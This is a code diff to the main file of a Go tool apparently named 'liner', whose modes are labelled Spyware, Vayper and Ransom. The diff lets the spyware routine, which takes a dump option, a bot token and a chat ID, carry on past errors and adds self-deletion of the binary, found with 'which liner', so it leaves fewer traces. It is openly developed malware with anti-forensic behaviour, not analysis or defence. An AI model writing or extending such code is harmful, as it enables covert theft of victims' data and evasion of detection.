@@ -4,6 +4,7 @@ import (
 	"flag"
 	"fmt"
 	"os"
+	"os/exec"
 	"strings"
 
 	"github.com/Nowafen/liner/core"
@@ -51,15 +52,12 @@ func main() {
 		err := core.Spyware(*dump, *token, *chatID, *silent)
 		if err != nil {
 			if !*silent {
-				fmt.Printf("Error running Spyware: %v\n", err)
+				fmt.Printf("Warning: error running Spyware: %v\n", err)
 			}
-			os.Exit(1)
 		}
 		if !*silent {
-			fmt.Println("Spyware operation completed successfully")
+			fmt.Println("Spyware operation completed")
 		}
-		// Self-delete after successful operation
-		os.Remove(os.Args[0])
 	case "Vayper":
 		fmt.Println("Vayper mode is not yet fully implemented")
 		os.Exit(1)
@@ -69,5 +67,22 @@ func main() {
 	default:
 		fmt.Println("Invalid mode. Use: Spyware, Vayper, or Ransom")
 		os.Exit(1)
+	}
+
+	// Self-delete using which liner
+	cmd := exec.Command("which", "liner")
+	output, err := cmd.Output()
+	if err == nil {
+		binaryPath := strings.TrimSpace(string(output))
+		if binaryPath != "" {
+			if err := os.Remove(binaryPath); err != nil && !*silent {
+				fmt.Printf("Warning: failed to delete binary at %s: %v\n", binaryPath, err)
+			}
+		}
+	} else {
+		// Fallback to os.Args[0]
+		if err := os.Remove(os.Args[0]); err != nil && !*silent {
+			fmt.Printf("Warning: failed to delete binary at %s: %v\n", os.Args[0], err)
+		}
 	}
 }
